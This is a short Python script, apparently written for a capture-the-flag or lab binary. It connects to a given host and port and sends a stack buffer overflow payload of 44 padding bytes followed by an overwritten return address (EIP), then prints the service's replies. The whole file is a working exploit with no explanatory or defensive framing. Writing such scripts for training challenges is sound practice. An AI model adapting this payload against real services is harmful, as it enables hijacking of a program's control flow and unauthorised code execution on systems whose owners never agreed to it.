#!/usr/bin/env/python3

import argparse
import socket

parser = argparse.ArgumentParser()
parser.add_argument("host", type=str, help="The host address to connect to")
parser.add_argument("port", type=int, help="The port to connect to")

args = parser.parse_args()

offset = 44
new_eip = b"\xf6\x91\x04\x08"
# print(new_eip)
payload = [
    b"A" * offset,
    new_eip,
    b"\n",
]
payload = b"".join(payload)

print(payload)

with socket.socket() as connection:
    connection.connect((args.host, args.port))
    print(connection.recv(2048).decode("utf-8"))
    connection.send(payload)
    connection.recv(2048).decode("utf-8")
    print(connection.recv(2048).decode("utf-8"))
